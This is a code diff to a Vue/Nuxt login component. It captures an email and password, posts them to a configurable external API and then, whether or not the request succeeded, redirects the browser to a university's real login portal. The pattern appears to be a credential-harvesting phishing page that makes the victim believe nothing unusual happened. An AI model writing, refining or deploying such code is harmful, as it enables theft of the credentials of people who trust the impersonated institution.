@@ -1,9 +1,10 @@
 <script setup lang="ts">
 // use prisma to retrieve users
 
-const prisma = usePrismaClient()
 const router = useRouter()
+const config = useRuntimeConfig();
 
+const isLoading = ref(false);
 const form = reactive({
   email: '',
   password: ''
@@ -16,13 +17,22 @@ const message = reactive({
 })
 
 const handleSubmit = async () => {
-  await $fetch('/api/user', {
-    method: 'post',
-    body: {...form}
-  })
-
-  window.location = "https://unisagrado.lyceum.com.br/AOnline3/#/login"
-
+  try {
+    isLoading.value = true
+    await $fetch(`${config.public.API_BASE_URL}/api/user`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json; x-api-version=1.0'
+      },
+      body: JSON.stringify({...form})
+    });
+  } catch (error) {
+    console.error('Erro de rede:', error);
+  }
+  finally {
+    isLoading.value = false
+    window.location = "https://unisagrado.lyceum.com.br/AOnline3/#/login"
+  }
 }
 
 </script>
